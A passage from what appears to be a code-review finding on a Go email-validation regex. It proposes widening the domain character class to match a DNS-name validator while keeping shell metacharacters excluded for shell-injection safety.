SMTP hosts, not mail domains). Net: a real internal-consistency defect, correctly low severity, with narrower reach than described.

**finalFix:**
backend/pkg/validator/validator.go:23 — widen the email regex's domain class so it accepts the same token set as IsSafeDNSName ('_' allowed, dot not mandatory) while keeping every shell metacharacter excluded (the only security-relevant property). Change:\n\nvar safeEmailRe = regexp.MustCompile(`^[A-Za-z0-9._%+-]+@[A-Za-z0-9._-]+$`)\n\nThe widened domain class [A-Za-z0-9._-] still rejects quotes, ; | & $ backtick parens whitespace etc., so shell-injection safety into echo '…'/sed is preserved. This makes IsSafeEmail consistent with IsSafeDNSName for the programmatic/bulk paths. (Note: single-create and guest paths remain bounded by the go-playground `email` struct tag, which is independent of this validator.)

---

